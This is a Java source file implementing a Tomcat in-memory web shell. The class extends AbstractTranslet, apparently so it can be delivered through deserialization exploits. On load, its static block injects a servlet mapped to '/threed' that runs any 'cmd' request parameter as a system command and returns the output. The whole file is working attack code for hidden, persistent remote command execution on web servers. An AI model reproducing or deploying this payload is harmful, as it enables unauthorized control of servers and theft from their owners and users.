package com.threed.shell.tomcat;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Scanner;

/**
 * @className: TomcatServletInject
 * @description: TODO 类描述
 * @author: two_day
 * @date: 2022/5/27
 **/
public class TomcatServletInject extends AbstractTranslet implements Servlet{

    static {
        try{
            String servletName = "threeworld";
            StandardContext context = getStandardContext();
            if (context != null){
                //避免重复添加

                System.out.println(servletName);

                Servlet httpServlet = new TomcatServletInject();
                Wrapper wrapper = context.createWrapper();

                wrapper.setName(servletName);
                wrapper.setLoadOnStartup(1);

                wrapper.setServlet(httpServlet);
                wrapper.setServletClass(httpServlet.getClass().getName());

                context.addChild(wrapper);
                context.addServletMappingDecoded("/threed", servletName);
                System.out.println("servlet inject success");
            }
        } catch(Exception e){
            System.out.println(e);
        }
    }
    private static StandardContext getStandardContext() {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        return (StandardContext) webappClassLoaderBase.getResources().getContext();
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest)servletRequest;
        HttpServletResponse response =  (HttpServletResponse)servletResponse;

        String method = request.getMethod();
        if ("GET".equals(method)){
            String cmd = request.getParameter("cmd");
            if (cmd != null){
                Process process = Runtime.getRuntime().exec(cmd);
                Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\a");;
                String output = s.hasNext() ? s.next() : "";
                PrintWriter writer = response.getWriter();
                writer.write(output);
                writer.flush();
                writer.close();
            }
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
